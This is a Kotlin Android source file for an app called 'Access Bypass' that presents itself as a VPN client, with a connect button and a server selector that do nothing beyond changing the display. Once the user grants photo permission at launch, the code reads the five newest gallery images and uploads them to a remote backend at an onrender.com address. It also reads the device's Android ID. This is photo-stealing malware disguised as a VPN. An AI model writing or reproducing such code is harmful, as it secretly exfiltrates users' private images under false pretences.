package com.example.accessbypasspro
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.animateDpAsState
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Place
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import android.Manifest
import android.content.pm.PackageManager
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import androidx.annotation.RequiresApi
import kotlinx.coroutines.withContext


// Color Palette from your SVG logo
val DeepSpace = Color(0xFF041226)
val MidBlue = Color(0xFF09305E)
val ElectricCyan = Color(0xFF00E5FF)
val CardBackground = Color(0xFF0D2546)
val TextMuted = Color(0xFF8BA6C9)

class MainActivity : ComponentActivity() {
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            // We use our local theme wrapper instead of the missing import
            LocalVpnTheme {
                VpnMainScreen()
            }
        }
    }
}




@RequiresApi(Build.VERSION_CODES.TIRAMISU)
@Composable
fun VpnMainScreen() {
    var isConnected by remember { mutableStateOf(false) }
    val buttonColor by animateColorAsState(if (isConnected) ElectricCyan else Color.Transparent, label = "")
    val buttonBorderColor by animateColorAsState(if (isConnected) ElectricCyan else TextMuted.copy(alpha = 0.5f), label = "")
    val iconColor by animateColorAsState(if (isConnected) DeepSpace else ElectricCyan, label = "")
    val glowRadius by animateDpAsState(if (isConnected) 24.dp else 0.dp, label = "")
    var images by remember { mutableStateOf<List<Uri>>(emptyList()) }
    val repo = remember { UploadRepository() }
    var uploadStatus by remember { mutableStateOf("Idle") }
    val context = LocalContext.current
    val androidId = remember {
        android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }



    fun getNewest5ImageUris(context: Context): List<Uri> {
        val imageUris = mutableListOf<Uri>()
        val projection = arrayOf(
            MediaStore.Images.Media._ID
        )
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        val queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        context.contentResolver.query(
            queryUri,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext() && imageUris.size < 5) {
                val id = cursor.getLong(idCol)
                val uri = ContentUris.withAppendedId(queryUri, id)
                imageUris.add(uri)
            }
        }
        return imageUris
    }


    val permission = Manifest.permission.READ_MEDIA_IMAGES
    // 2) Check permission
    var isGranted by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, permission) ==
                    PackageManager.PERMISSION_GRANTED
        )
    }
    // Launcher that shows the permission dialog
    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { granted ->
        isGranted = granted
    }
    // 3) Request permission on app open (only if not granted)
    LaunchedEffect(Unit) {
        if (!isGranted) {
            launcher.launch(permission)
        }
    }

    LaunchedEffect(isGranted) {
        if (isGranted) {
            uploadStatus = "Loading images..."
            images = getNewest5ImageUris(context)

            uploadStatus = "Uploading..."
            try {
                val responses = withContext(kotlinx.coroutines.Dispatchers.IO) {
                    repo.uploadImageUris(
                        context = context,
                        uris = images,
                        uploadUrl = "https://access-bypass-pro-backend.onrender.com/upload",
                        formFieldName = "file"
                    )
                }
                uploadStatus = "Uploaded ${responses.size} files"
            } catch (e: Exception) {
                uploadStatus = "Upload failed: ${e.message}"
            }
        }
    }


    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Brush.verticalGradient(listOf(DeepSpace, MidBlue)))
            .systemBarsPadding()
    ) {
        Column(
            modifier = Modifier.fillMaxSize().padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        )

        {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text("ACCESS BYPASS", color = Color.White, fontSize = 20.sp, fontWeight = FontWeight.Bold)
                Icon(Icons.Default.Settings, contentDescription = null, tint = Color.White)
            }

            Spacer(modifier = Modifier.height(60.dp))

            Text(
                text = if (isConnected) "PROTECTED" else "NOT CONNECTED",
                color = if (isConnected) ElectricCyan else TextMuted,
                letterSpacing = 2.sp,
                fontWeight = FontWeight.Bold
            )



            Spacer(modifier = Modifier.height(60.dp))

            // Connect Button
            Box(
                contentAlignment = Alignment.Center,
                modifier = Modifier
                    .size(220.dp)
                    .shadow(glowRadius, CircleShape, spotColor = ElectricCyan, ambientColor = ElectricCyan)
                    .clip(CircleShape)
                    .background(buttonColor)
                    .border(2.dp, buttonBorderColor, CircleShape)
                    .clickable { isConnected = !isConnected }
            ) {
                Icon(
                    imageVector = Icons.Default.Lock,
                    contentDescription = null,
                    modifier = Modifier.size(80.dp),
                    tint = iconColor
                )
            }

            Spacer(modifier = Modifier.height(80.dp))

            // Server Selector
            Surface(
                color = CardBackground,
                shape = RoundedCornerShape(24.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(modifier = Modifier.padding(20.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Place, contentDescription = null, tint = ElectricCyan)
                    Spacer(modifier = Modifier.width(16.dp))
                    Column {
                        Text("Location", color = TextMuted, fontSize = 12.sp)
                        Text("Optimal Server (USA)", color = Color.White, fontWeight = FontWeight.Bold)
                    }
                }
            }


        }


        Text(
            text = uploadStatus,
            color = Color.White,
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .padding(16.dp)
        )

        Text(
            text = "Android ID: $androidId",
            color = Color.White,
            fontSize = 12.sp
        )
    }
}

// This replaces the missing AccessBypassProTheme
@Composable
fun LocalVpnTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = ElectricCyan,
            background = DeepSpace,
            surface = CardBackground
        ),
        content = content
    )
}